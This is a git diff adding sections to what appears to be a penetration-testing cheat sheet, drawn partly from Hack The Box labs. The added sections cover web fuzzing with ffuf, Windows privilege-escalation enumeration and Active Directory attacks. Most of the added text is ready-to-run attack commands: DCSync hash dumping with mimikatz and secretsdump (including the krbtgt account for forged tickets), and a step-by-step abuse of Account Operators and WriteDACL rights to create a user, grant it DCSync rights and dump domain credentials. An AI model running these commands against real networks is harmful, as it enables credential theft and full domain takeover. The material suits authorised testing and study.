@@ -498,6 +498,20 @@ Subdomains via vhost fuzzing:
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" | grep -vE "Words: 186"
 ```
 
+### Find directories
+
+```
+ffuff -w <wordlist> -u http://<IP/FUZZ/> -fw 525
+```
+
+- `-fw 525` is to hidde the first comments. You have to indicate the words that show the comments.
+
+### Find files
+
+```
+ffuff -w <wordlist> -u http://<IP/FUZZ> -fw 525 -e .bak,.js,.html,.txt
+```
+
 ---
 
 ## Fping
@@ -3175,7 +3189,48 @@ copy golden.kirbi \\<attacker_ip>\smbFolder\golden.kirbi
 
 ## DCSync
 
-Obtain NTLM hashes of users:
+The user need to have the permission, `DS-Replication-Get-Changes` y `Get-Changes-All`
+
+### Mimikatz
+
+You can upload a mimikatz binary to the DC or a windows machine.
+
+Obtain NTLM hashes of users.
+
+Only for a user:
+
+```
+lsadump::dcsync /domain:corp.local /user:krbtgt
+```
+
+Normally for krbtgt account because is the account that sign all the hashes. This means that if you have the hash of this account, you can create all the TGTs that you want. This allow you to:
+- persistence
+- Escalate/impersonate: Create a ticket indicating any user, including one that doesn't exist, that belongs to the groups that you want.
+
+For administrator user:
+```
+lsadump::dcsync /domain:corp.local /user:Administrator
+```
+
+For all users:
+
+```
+lsadump::dcsync /domain:corp.local /all /csv
+```
+
+### impacket-secretsdump
+
+With credentials in clear text:
+```
+secretsdump.py corp.local/admin:'Password123'@10.10.10.5 -just-dc
+```
+
+- `-just-dc`: only do DCSync
+
+Only hashes NTLM
+```
+secretsdump.py corp.local/admin:'Password123'@10.10.10.5 -just-dc-ntlm
+```
 
 ---
 
@@ -3293,10 +3348,39 @@ Common external targets for password spraying with AD credentials:
 
 ## Windows Privilege Escalation
 
-Check if autologin is enable for some user, you can see the user in field DefaultUserName and password in field DefaultPassword with:
+> [!NOTE]
+> If you don't found nothing you can always use BloodHound or upload linpeas/winpeas binary
 
-```cmd
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+### Obtain basic information
+
+```
+net user support
+```
+
+```
+net group
+```
+
+```
+net localgroups
+```
+
+Show security privileged assigned:
+```powershell
+whoami /priv
+```
+
+If you don't know if you can escalate with the permission, you can check hacktricks or search in google. Some dangerous permission:
+- `SeImpersonatePrivilege`.
+
+Check groups of the user
+```
+whoami /groups
+```
+
+Check logon requirements. Useful for bruteforce.
+```
+net accounts
 ```
 
 ### Scheduled Tasks
@@ -3304,6 +3388,12 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 There are two main approach to take advantages of scheduled tasks:
 1. Add new scheduled task jobs
 2. Trick them to execute a malicious software
+
+Check if autologin is enable for some user, you can see the user in field DefaultUserName and password in field DefaultPassword with:
+
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
 
 ### Search exposed credentials
 
@@ -3316,6 +3406,9 @@ It's possible that one password found it's used in another user, program, servic
 ### Vulnerable software
 
 In Windows you can look in `C:\Program Files` to find software.
+
+You have more ways here:
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#user-enumeration
 
 ### Kernel exploits
 
@@ -3446,6 +3539,86 @@ export KRB5CCNAME=Administrator.ccache
 ```bash
 impacket-psexec -k dc.support.htb
 ```
+
+### Check if some user is kerberoastable and as-rep roastable
+
+You can check with bloodhound in analysis tab. Or with the tools.
+
+### Abuse Account Operator group + WriteDACL in another group
+
+If you have a user that is part from Account Operator means that you can create non administrator user, groups and assign groups to the users created.
+
+If in another group you see WriteDACL permission, that means that you can abuse to use DcSync Attack.
+
+With both, you can create a user and assigned to that group that have WriteDACL permission to do a DcSync attack and escalate privilege.
+
+Create the user:
+```
+net user sergiky sergik123 /add /domain
+```
+
+Add the user as a member of the group:
+```
+net group "Exchange Windows Permission" sergiky /add
+```
+
+Also, if it is possible, to connect directly we can do member of remote management user or other group like this:
+```
+net localgroup "Remote Management Users" sergiky /add
+```
+
+Upload PowerView and import them, `Import-Module .\PowerView.ps1`.
+
+Create the password. PSCredential force to create a password as SecureString.
+```
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+```
+
+Build a credential object indicating a user and a password. When you use `-Credential $Cred` in another command, the command will be executed **for that user in the variable**, not for the user that is executing the command.
+```
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+```
+
+Create an Access Control Entry (ACE) for the ACL of the object of the domain
+```
+Add-ObjectAcl -PrincipalIdentity sergiky -Credential $cred -Rights DCSync
+```
+
+- `Rights DCSync`: Active `DS-Replication-Get-Changes` and `-Get-Changes-All` to allow the dcsync for that user
+
+> [!WARNING]
+> In BloodHound doesn't indicate `-PrincipalIdentity <user>`, if you don't write this it is possible that doesn't work.
+
+I recommend you to check If the ACE was added.
+
+```
+dsacls "DC=testlab,DC=local" | Select-String "Replicating"
+```
+
+#### Do the DcSync
+
+With mimikatz:
+```
+lsadump::dcsync /domain:testlab.local /user:Administrator
+```
+
+Or with secretdump:
+```
+/secretsdump.py htb.local/john@10.10.10.161
+```
+
+If you want to cleanup
+
+```
+Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+```
+
+Or if you want to do all automatic from linux:
+```
+./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00pyAdministrator:Password123
+```
+
+- https://github.com/n00py/DCSync
 
 ---
 
